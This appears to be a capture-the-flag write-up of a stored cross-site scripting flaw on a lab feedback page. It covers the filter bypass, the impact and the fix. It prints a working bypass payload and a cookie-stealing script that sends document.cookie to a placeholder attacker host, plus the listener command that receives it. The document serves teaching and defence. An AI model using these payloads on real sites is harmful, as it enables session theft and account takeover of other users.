# Flag — Cross-Site Scripting (feedback page)

**Category:** OWASP A05:2025 – Injection
**Sub-type:** Stored XSS (CWE-79)
**Location:** `/?page=feedback`

---

## 1. Discovery

The feedback page lets you submit text that is then displayed to **everyone** who
visits the page — a textbook target for stored XSS.

The `name` field had a `maxlength` set in the HTML, but that limit is **client-side
only**: by opening the dev tools (F12) we edited the attribute directly in the DOM
to fit a longer payload.

```html
<input name="txtName" type="text" size="30" maxlength="10">
<!-- maxlength edited to 100 in the DOM -->
```

First attempt: `<script>alert(1)</script>` as the name. No alert fired. Inspecting
the raw HTML of the response, our input came back as:

```
alert(1)</script>
```

So the server-side filter had **stripped the opening `<script>` tag** — a naive
**blacklist** that looks for the exact string `<script>` and removes it (leaving the
rest untouched).

The bypass: the blacklist only matched the tag with no space, so we added one.

```html
<script >alert(1)</script>
```

`<script >` doesn't match the `<script>` pattern, so it survived the filter and the
browser still parsed it as a valid script tag. The alert fired. After submitting,
the payload is stored and re-executes for every visitor — and we got the flag.

## 2. Impact

This is **stored** XSS, so the payload is saved server-side and runs in the browser
of **every** visitor to the feedback page — with *their* session and *their*
privileges. That is what makes it high-impact: we are no longer attacking our own
browser, but everyone else's, including an administrator's.

Concrete attack — cookie theft. Instead of `alert(1)`, we could store:

```html
<script >new Image().src="http://<attacker-ip>:8000/?c="+encodeURIComponent(document.cookie)</script>
```

With a listener running on our side (`python3 -m http.server 8000`), the moment an
admin loads the feedback page, their cookie is sent to us. If that cookie is a valid
session token, we replay it and are logged in **as the admin** — full account
takeover without ever knowing a password.

It also goes beyond cookie theft: because the script runs inside the victim's
session, it can also **act on their behalf** — read pages only they can see, submit
forms, or trigger privileged actions, all from their authenticated browser.

## 3. Remediation

The real fix is **output encoding**, not tag filtering.

- **Encode user data on output.** Whenever stored input is
  rendered back into HTML, encode the special characters so the browser treats it as
  **text, not markup**. In PHP, wrap the output in `htmlspecialchars()`:

  ```php
  echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
  ```

  `<script >alert(1)</script>` then becomes `&lt;script &gt;alert(1)&lt;/script&gt;`
  and is displayed as literal text — it can never execute. The danger is
  *neutralized*, not *removed*.

- **Do not rely on a blacklist** (removing `<script>`, etc.). This is exactly what
  failed here: it was bypassed with a single space, and there are countless other
  vectors that need no `<script>` tag at all (`<img onerror=...>`, `<svg onload=...>`,
  event handlers, …). Blacklisting tags is a losing game; encoding output is what
  works.

- **Defence in depth:** set a **Content-Security-Policy** that blocks inline
  JavaScript, and set **`HttpOnly`** on session cookies so that even a successful XSS
  cannot read them via `document.cookie`.
